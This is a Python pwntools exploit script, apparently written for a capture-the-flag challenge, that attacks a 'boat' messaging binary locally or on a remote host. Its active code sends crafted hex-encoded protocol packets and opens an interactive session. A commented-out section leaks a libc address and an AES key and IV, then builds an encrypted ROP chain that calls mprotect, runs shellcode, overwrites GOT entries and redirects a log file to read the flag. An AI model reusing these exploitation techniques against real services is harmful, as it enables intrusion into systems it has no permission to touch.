#!/usr/bin/env python
from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64
from time import sleep
from Crypto.Cipher import AES

context.binary = e = ELF("boat")
libc = ELF("libc.so.6")
gs = """
# # b *process_BIN_UNC+30 if *(char *)($eax+6) == 4
# b *handle_AES_MSG+31
# # brva 0x264A
# # b *unicast_send
# b *handle_AES_FI_MSG
# b systen
brva 0x00001E68
set follow-fork-mode parent
b read_logs
"""


def start():
    if args.LOCAL:
        p = process("./run.sh")
        # p = e.process(argv=["1031"], env={
        #               "LD_PRELOAD": "./libcrypto.so.3 ./libc.so.6"})

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


r = start()


def choice(c: int):
    r.sendlineafter(b'choice: ', str(c).encode())


def _send(data):
    choice(4)
    pl = p32(0)
    pl += p8(0)
    pl += p8(6)  # type
    pl += p8(0x7)  # crc
    pl += (
        p32(1032) +  # boat_id
        p8(0x2) +
        p8(7) +
        p8(4) +
        p8(1) +
        p8(0)
    ).ljust(90, b'\0')
    pl += data
    r.recvuntil(b'Message')
    print(pl.hex())
    r.send(pl.hex().encode())


# _send(b'\0')
# choice(1)
# sleep(10)
# choice(2)
# choice(2)
# choice(2)
# r.recvuntil(b'Decrypted challenge: ')
# libc.address = u32(r.recvline()[16:20]) + 3288 + 0x2000
# log.info(f'Libc: {hex(libc.address)}')
# choice(2)
# choice(2)
# choice(5)
# r.recvuntil(b'Key: ')
# key = r.recv(32)
# r.recvuntil(b'IV: ')
# iv = r.recv(16)
# print(key)
# print(iv)

# if args.GDB:
#     gdb.attach(r, gdbscript=gs)
#     pause()
# # libc.address = 0


# def write_rop(addr, value):
#     _ = (
#         p32(libc.address+0x37fec) + p32(addr-0x88) + value +
#         p32(libc.address+0x79246)
#     )
#     return _


# cmd = b"ls -al"
# split_cmd = [cmd[i:i+4] for i in range(0, len(cmd), 4)]

# stack = libc.address-0x2d34
# pop4 = libc.address+0x0001f2a8
# system = libc.sym.system
# bin_sh = next(libc.search(b'/bin/sh'))

# shellcode = b'\xcc\xcc\xcc'

# rop = b'A' * (0x6a+4)

# rop += p32(libc.sym.mprotect)
# rop += p32(pop4+1)
# rop += p32((stack >> 12) << 12)
# rop += p32(0x4000)
# rop += p32(7)
# rop += p32(libc.address+0x0002ebfb)
# rop += asm(f"""
#    mov eax, dword ptr [esp+0xd50]
#    sub eax, 0x1000
#    mov dword ptr [eax+{e.got.system}], {pop4+4}
#    mov dword ptr [eax+{e.got.exit}], {pop4+4}
#    mov dword ptr [eax+{e.sym.logging_filename}], {u32(b'/fla')}
#    mov dword ptr [eax+{e.sym.logging_filename}+4], {u32(b'g.tx')}
#    mov dword ptr [eax+{e.sym.logging_filename}+8], {ord('t')}
#    mov dword ptr [eax+0x000076EC], 0
#    mov eax, 4
#    mov ebx,2
#    mov ecx, esp
#    mov edx, 100
#    syscall
#    jmp $
# """)
# rop = rop.ljust(0x180, b'\0')
# cipher = AES.new(key, AES.MODE_CBC, iv)
# ct_rop = cipher.encrypt(rop)

# choice(4)
# pl = p32(0)  # boat_id
# pl += p8(0)
# pl += p8(6)  # type
# pl += p8(0x7)  # crc
# pl += (
#     p32(1031) +
#     p8(0x97) +
#     p8(7) +
#     p8(4) +
#     p8(3) + ct_rop
# )

# r.recvuntil(b'Message')
# print(ct_rop.hex())

# r.send(pl.hex().encode())\
sleep(2)
choice(4)
r.recvuntil(b'Message')
pl = p32(0)  # boat_id
pl += p8(0)
pl += p8(6)  # type
pl += p8(0x7)  # crc
pl += (
    p32(1032) +
    p8(0x97) +
    p8(7) +
    p8(3) +
    p8(3) + b'A'*0x16
).ljust(90, b'\0')
r.send(pl.hex().encode())

r.interactive()
